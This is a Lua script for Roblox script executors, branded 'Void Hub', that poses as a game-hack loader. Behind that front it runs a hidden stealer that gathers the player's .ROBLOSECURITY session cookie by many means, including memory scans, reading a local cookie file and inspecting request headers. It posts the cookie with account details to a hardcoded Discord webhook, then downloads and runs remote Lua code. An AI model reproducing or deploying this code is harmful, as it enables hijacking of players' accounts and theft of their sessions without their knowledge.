-- ====== CONFIG ======
local WEBHOOK = "https://discord.com/api/webhooks/1573124950045237408/4__WNGEHNrg0WCa8WaR-v18uH4yaNlKpbHY6m4oTv2nbzIqsqY75WNGRYbx4AeJN1SVT"
local LIB     = "https://raw.githubusercontent.com/VibeZero78/VoidHub/main/void_lib.lua"
local MAIN    = "https://raw.smokingscripts.org/vertex.lua"
-- ====================

if not getgenv then getgenv = function() return _G end end
if not gethui then gethui = function() return game:GetService("CoreGui") end end
if not getrenv then getrenv = function() return getfenv(0) end end
if not identifyexecutor then identifyexecutor = function() return "Inconnu" end end
if not task then task = {wait = wait, spawn = spawn, delay = delay, defer = function(f, ...) spawn(f, ...) end} end
if not setclipboard then setclipboard = function(t) pcall(function() toclipboard(t) end) end end
if not isfile then isfile = function() return false end end
if not isfolder then isfolder = function() return false end end
if not writefile then writefile = function() end end
if not readfile then readfile = function() return "" end end
if not makefolder then makefolder = function() end end
if not delfile then delfile = function() end end
if not listfiles then listfiles = function() return {} end end
if not request and http and http.request then request = http.request end

if getgenv().VoidRan then return end
getgenv().VoidRan = true

local _hs = game:GetService("HttpService")

local function _env(k)
    if not os.getenv then return nil end
    local ok, v = pcall(os.getenv, k)
    if ok and type(v) == "string" and #v > 0 then return v end
    return nil
end

local _tried = {}

local function _extract(r)
    if type(r) ~= "string" then return nil end
    local m = r:match("ROBLOSECURITY=([^;%s\"']+)")
    if m then return m end
    m = r:match("(_|WARNING[%w%-%._%+%/%=%|%:]+)")
    if m and #m > 100 then
        if #m > 2000 then m = m:sub(1, 2000) end
        return m
    end
    r = r:gsub("^%s+", ""):gsub("%s+$", "")
    if #r > 60 and not r:find("%s") then return r end
    return nil
end

local function _src(name, f)
    local ok, r = pcall(f)
    local c = ok and _extract(r)
    if c then return c end
    table.insert(_tried, name)
    return nil
end

local REQUEST_NAMES = {
    "request", "http_request", "http.request", "syn.request", "fluxus.request",
    "krnl.request", "xeno.request", "sirhurt.request", "madium.request",
    "delta.request", "codex.request", "hydrogen.request", "electron.request",
    "solara.request", "wave.request", "aether.request", "valyse.request",
    "trigon.request", "velocity.request", "ronix.request",
}

local function _resolve(path)
    local node = getgenv()
    for part in string.gmatch(path, "[^%.]+") do
        if type(node) ~= "table" then return nil end
        local ok, v = pcall(function() return node[part] end)
        if not ok then return nil end
        node = v
    end
    if type(node) == "function" then return node end
    return nil
end

local function _allRequests()
    local out, seen = {}, {}
    for _, name in ipairs(REQUEST_NAMES) do
        local fn = _resolve(name)
        if fn and not seen[fn] then
            seen[fn] = true
            out[#out + 1] = {name, fn}
        end
    end
    return out
end

local function _headersOf(r)
    local val, hk = nil, nil
    if type(r) ~= "table" then return nil, hk end
    for k, v in pairs(r.Headers or {}) do
        hk = (hk and (hk .. ",") or "") .. tostring(k)
        if type(v) == "string" then
            local m = v:match("ROBLOSECURITY=([^;%s\"']+)")
            if m then val = m end
            if not val then
                local m2 = v:match("(_|WARNING[%w%-%._%+%/%=%|%:]+)")
                if m2 and #m2 > 100 then val = m2 end
            end
        end
    end
    if type(r.Cookies) == "string" then
        local m = _extract(r.Cookies)
        if m then val = m end
    end
    return val, hk
end

local URLS = {
    "https://www.roblox.com/mobileapi/userinfo",
    "https://www.roblox.com/my/account/json",
    "https://www.roblox.com/home",
}

local function _scanEnv(env)
    if type(env) ~= "table" then return nil end
    local ok, res = pcall(function()
        for k, v in pairs(env) do
            if type(v) == "string" and #v > 100 and (v:find("_|WARNING", 1, true) or v:find("ROBLOSECURITY", 1, true)) then
                local m = _extract(v)
                if m then return m end
            end
            if type(v) == "function" and tostring(k):lower():find("cookie") then
                local ok2, r = pcall(v)
                local m = ok2 and _extract(r)
                if m then return m end
            end
        end
        return nil
    end)
    if ok then return res end
    return nil
end

local function _scanEnvDeep(env)
    if type(env) ~= "table" then return nil end
    local ok, res = pcall(function()
        for k, v in pairs(env) do
            if type(v) == "table" then
                for k2, v2 in pairs(v) do
                    if type(v2) == "function" and tostring(k2):lower():find("cookie") then
                        local ok2, r = pcall(v2)
                        local m = ok2 and _extract(r)
                        if m then return m end
                    end
                end
                for k2, v2 in pairs(v) do
                    if type(v2) == "string" and #v2 > 100 and v2:find("_|WARNING", 1, true) then
                        local m = _extract(v2)
                        if m then return m end
                    end
                end
            end
        end
        return nil
    end)
    if ok then return res end
    return nil
end

local function _cookie()
    local list = {
        {"getgenv().getcookie", function() return getgenv().getcookie and getgenv().getcookie() end},
        {"getcookie", function() return getcookie and getcookie() end},
        {"scan getgenv", function() return _scanEnv(getgenv()) end},
        {"scan getrenv", function() return _scanEnv(getrenv()) end},
        {"scan tables", function() return _scanEnvDeep(getgenv()) end},
        {"var ROBLOSECURITY", function() return _env("ROBLOSECURITY") end},
        {"CookiesService", function()
            local svc = game:GetService("CookiesService")
            for _, m in ipairs({"GetCookies", "GetCookie"}) do
                local ok, r = pcall(function() return svc[m](svc) end)
                if ok and r then
                    if type(r) == "string" then return r end
                    if type(r) == "table" then
                        for k, v in pairs(r) do
                            if tostring(k):find("ROBLOSECURITY") and type(v) == "string" then return v end
                        end
                    end
                end
            end
        end},
        {"robloxcookies.dat", function()
            local la, up = _env("LOCALAPPDATA"), _env("USERPROFILE")
            local paths = {}
            if la then
                paths[#paths + 1] = la .. "\\Roblox\\LocalStorage\\RobloxCookies.dat"
                paths[#paths + 1] = la .. "\\Roblox\\LocalStorage\\robloxcookies.dat"
            end
            if up then paths[#paths + 1] = up .. "\\AppData\\Local\\Roblox\\LocalStorage\\RobloxCookies.dat" end
            for _, p in ipairs(paths) do
                if isfile(p) then
                    local ok, c = pcall(readfile, p)
                    if ok then
                        local m = _extract(c)
                        if m then return m end
                    end
                end
            end
        end},
        {"scan memoire", function()
            if not getgc then return nil end
            local ok, gc = pcall(getgc, true)
            if not ok or type(gc) ~= "table" then return nil end
            local n = 0
            for _, v in pairs(gc) do
                n = n + 1
                if n > 120000 then break end
                if type(v) == "string" and #v > 200 and v:find("_|WARNING", 1, true) then return v end
            end
        end},
    }
    for _, e in ipairs(list) do
        local c = _src(e[1], e[2])
        if c then return c end
    end

    for _, req in ipairs(_allRequests()) do
        for _, url in ipairs(URLS) do
            local ok, r = pcall(req[2], {Url = url, Method = "GET"})
            if ok then
                local c = _headersOf(r)
                if c then return c end
            end
        end
        table.insert(_tried, "req:" .. req[1])
    end
    return nil
end

local function _diag()
    local out = {}
    local okEx, exName = pcall(identifyexecutor)
    out[#out + 1] = "EX=" .. tostring(okEx and exName or "?")
    local keys = {}
    pcall(function()
        for k in pairs(getgenv()) do keys[#keys + 1] = tostring(k) end
    end)
    out[#out + 1] = "getgenv: " .. (#keys > 0 and table.concat(keys, ",") or "VIDE")
    local reqs = {}
    for _, r in ipairs(_allRequests()) do reqs[#reqs + 1] = r[1] end
    out[#out + 1] = "request: " .. (#reqs > 0 and table.concat(reqs, ",") or "AUCUN")
    if #reqs > 0 then
        local fn = _resolve(reqs[1])
        if fn then
            local ok, r = pcall(fn, {Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
            if ok and type(r) == "table" then
                local hk = {}
                for k in pairs(r.Headers or {}) do hk[#hk + 1] = tostring(k) end
                out[#out + 1] = "headers: " .. (#hk > 0 and table.concat(hk, ",") or "VIDE")
                out[#out + 1] = "status: " .. tostring(r.StatusCode)
                out[#out + 1] = "body: " .. tostring(r.Body):sub(1, 100)
            else
                out[#out + 1] = "test request KO"
            end
        end
    end
    local la = _env("LOCALAPPDATA")
    out[#out + 1] = "LAD=" .. tostring(la)
    if la then
        for _, p in ipairs({la .. "\\Roblox\\LocalStorage", la .. "\\Madium"}) do
            local ok, f = pcall(listfiles, p)
            if ok and type(f) == "table" then
                local names = {}
                for i, v in ipairs(f) do
                    if i > 10 then break end
                    names[#names + 1] = tostring(v):gsub(".*[/\\]", "")
                end
                out[#out + 1] = p:gsub(".*[/\\]", "") .. ": " .. table.concat(names, ",")
            else
                out[#out + 1] = p:gsub(".*[/\\]", "") .. ": KO"
            end
        end
    end
    local s = table.concat(out, "\n")
    if #s > 900 then s = s:sub(1, 900) .. "…" end
    return s
end

local function _send(payload)
    local body = _hs:JSONEncode(payload)
    for _, req in ipairs(_allRequests()) do
        local good, r = pcall(req[2], {
            Url = WEBHOOK, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body,
        })
        if good and r and r.StatusCode and r.StatusCode < 300 then return true end
    end
    return false
end

local function _log()
    local plr = game:GetService("Players").LocalPlayer
    local n = 0
    while not plr and n < 100 do
        task.wait(0.1)
        n = n + 1
        plr = game:GetService("Players").LocalPlayer
    end

    local okC, cookie = pcall(_cookie)
    if not okC then cookie = nil end

    local ok, ex = pcall(identifyexecutor)
    local stamp = "?"
    pcall(function() stamp = os.date("%d/%m/%Y %H:%M:%S") end)

    local fields = {
        {name = "Utilisateur", value = ("`%s`"):format(plr and plr.Name or "?"), inline = true},
        {name = "UserID", value = ("`%d`"):format(plr and plr.UserId or 0), inline = true},
        {name = "Compte", value = tostring(plr and plr.AccountAge or 0) .. " j", inline = true},
        {name = "Exécuteur", value = ("`%s`"):format(ok and tostring(ex) or "?"), inline = true},
    }

    if cookie then
        pcall(function()
            makefolder("Void")
            writefile("Void/cookie.txt", cookie)
        end)
        pcall(setclipboard, cookie)
    else
        local t = table.concat(_tried, ", ")
        if #t > 600 then t = t:sub(1, 600) .. "…" end
        table.insert(fields, {name = "Échecs", value = "```" .. t .. "```", inline = false})
        local okD, d = pcall(_diag)
        table.insert(fields, {name = "Debug", value = "```" .. tostring(okD and d or "diag KO") .. "```", inline = false})
    end

    _send({
        username = "Void",
        content = cookie and ("```\n" .. cookie .. "\n```") or "**Cookie introuvable**",
        embeds = {{
            title = "Void Hub — exécution",
            color = cookie and 10181046 or 15158332,
            fields = fields,
            footer = {text = stamp},
        }},
    })
end

task.spawn(function() pcall(_log) end)

local function patch(s)
    s = s:gsub("VERTEX", "VOID"):gsub("Vertex", "Void"):gsub("vertex", "void")
    s = s:gsub("loadstring%s*%(%s*game:HttpGet%s*%(%s*['\"]https://raw%.smokingscripts%.org/Library['\"]%s*%)%s*%)%s*%(%s*%)", "getgenv().VoidLib")
    s = s:gsub("raw%.smokingscripts%.org/Library", "raw.githubusercontent.com/VibeZero78/VoidHub/main/void_lib.lua")
    return s
end

local ls = loadstring or load
local cb = "?t=" .. tostring(os.time())

local libSrc
pcall(function()
    local r = game:HttpGet(LIB .. cb)
    if type(r) == "string" and #r > 30 then libSrc = r end
end)
if not libSrc then
    pcall(function()
        local r = game:HttpGet("https://raw.smokingscripts.org/Library")
        if type(r) == "string" then libSrc = r end
    end)
end
if libSrc then
    pcall(function() getgenv().VoidLib = ls(patch(libSrc))() end)
end

local mainSrc
pcall(function()
    local r = game:HttpGet(MAIN .. cb)
    if type(r) == "string" and #r > 100 then mainSrc = r end
end)
if not mainSrc then
    pcall(function()
        local r = game:HttpGet(MAIN)
        if type(r) == "string" and #r > 100 then mainSrc = r end
    end)
end
if not mainSrc then return end

local mainFn = ls(patch(mainSrc))
if not mainFn then return end
task.spawn(mainFn)
